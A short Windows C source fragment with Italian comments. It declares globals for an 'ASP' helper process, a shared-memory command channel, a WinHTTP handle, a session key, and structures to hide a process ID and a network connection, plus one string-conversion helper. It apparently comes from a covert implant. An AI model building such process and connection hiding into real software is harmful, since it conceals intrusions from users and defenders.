#include <Windows.h>
#include "../common.h"
#include "../H4-DLL.h"
#include "../AM_Core.h"
#include "ASP.h"

HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
ASP_IPC_CTRL* ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
CONNECTION_HIDE connection_hide = NULL_CONNETCION_HIDE_STRUCT; // struttura per memorizzare il pid da nascondere
PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT; // struttura per memorizzare la connessione da nascondere
HINTERNET asp_global_request = 0; // Handle usato dalle winhttp per inviare/ricevere dati
BYTE asp_global_session_key[16];

// De-pascalizza la stringa (alloca la stringa)
WCHAR* UnPascalizeString(BYTE* data, DWORD* retlen)
{
	*retlen = *((DWORD*)data);
	data += sizeof(DWORD);

	return wcsdup((WCHAR*)data);
}


